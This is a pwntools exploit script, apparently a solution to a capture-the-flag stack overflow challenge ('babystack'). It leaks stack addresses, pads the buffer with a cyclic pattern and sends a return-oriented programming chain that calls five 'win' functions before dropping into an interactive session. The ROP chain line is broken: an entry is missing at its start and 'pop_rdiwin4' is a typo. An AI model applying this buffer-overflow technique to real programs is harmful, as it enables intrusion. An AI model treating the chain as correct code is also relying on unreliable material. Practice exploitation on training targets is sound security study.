#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babystack_level5
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babystack_level6')
context.terminal = ["tmux", "splitw", "-v"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def rop():
    pop_rdi = [0x4018b3]
    win1 = [0x40135f]
    win2 = [0x4013d6]
    win3 = [0x401455]
    win4 = [0x4014d4]
    win5 = [0x401553]
    chain = b''.join(map(p64,  + [1] + win1 + pop_rdi + [2] + win2 + pop_rdi + [3] + win3 + pop_rdi + [4] + pop_rdiwin4 + pop_rdi + [5] + win5))

    return chain

io.recvuntil(b'base pointer rbp: ')
bp = int(io.recvline(keepends=False), 16)
print(hex(bp))

io.recvuntil(b'will be stored: ')
buff = int(io.recvline(keepends=False), 16)
print(hex(buff))

exploit = cyclic(bp - buff + 8) + rop()
io.sendline(exploit)

io.interactive()